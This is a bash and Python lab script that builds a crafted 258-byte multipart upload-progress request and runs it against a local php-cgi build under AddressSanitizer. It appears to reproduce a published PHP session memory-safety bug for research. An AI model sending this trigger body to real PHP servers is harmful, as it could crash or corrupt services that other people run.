#!/bin/bash
# fast 258B trigger shape (their build_body), stock min_freq and min_freq=0 lab-observe
set -u
BASE=/tmp/opencode/realapps/side
CGI="$1"; SID="$2"; MINFREQ="${3:-1}"
BODY=$(mktemp /tmp/opencode/realapps/side/tmp/trigXXXX.bin)
# exact writeup 258B layout: PHPSESSID(32a), USP=x, file f/a with single Z
python3 - "$BODY" "$SID" <<'PY'
import sys
B = b"----b"
sid = sys.argv[2].encode()
h = b"--" + B + b"\r\n"
def field(name, val):
    return (h + b'Content-Disposition: form-data; name="' + name.encode()
            + b'"\r\n\r\n' + val + b"\r\n")
def filepart(name, fn, val):
    return (h + b'Content-Disposition: form-data; name="' + name.encode()
            + b'"; filename="' + fn.encode() + b'"\r\n\r\n' + val + b"\r\n")
body = (field("PHPSESSID", sid)
      + field("PHP_SESSION_UPLOAD_PROGRESS", b"x")
      + filepart("f", "a", b"Z")
      + b"--" + B + b"--\r\n")
open(sys.argv[1], "wb").write(body)
print("trig body bytes:", len(body))
PY
rm -f "$BASE/sess/sess_$SID"
TOT=$(stat -c%s "$BODY")
env REDIRECT_STATUS=200 REQUEST_METHOD=POST \
    CONTENT_TYPE='multipart/form-data; boundary=----b' \
    CONTENT_LENGTH=$TOT SCRIPT_FILENAME="$BASE/empty.php" QUERY_STRING='' \
    HTTP_COOKIE="PHPSESSID=$SID" GATEWAY_INTERFACE=CGI/1.1 SERVER_PROTOCOL=HTTP/1.1 \
    SERVER_NAME=lab "$CGI" -d cgi.force_redirect=0 -d "session.save_path=$BASE/sess" \
    -d "session.upload_progress.min_freq=$MINFREQ" \
    < "$BODY" > "$BASE/trig_$SID.out" 2> "$BASE/trig_$SID.err"
RC=$?
SZ=$(stat -c%s "$BASE/sess/sess_$SID" 2>/dev/null || echo NO)
AH=$(grep -c AddressSanitizer "$BASE/trig_$SID.err" 2>/dev/null || true)
echo "trigger sid=$SID min_freq=$MINFREQ exit=$RC sess=$SZ asan_hit=$AH"
rm -f "$BODY"
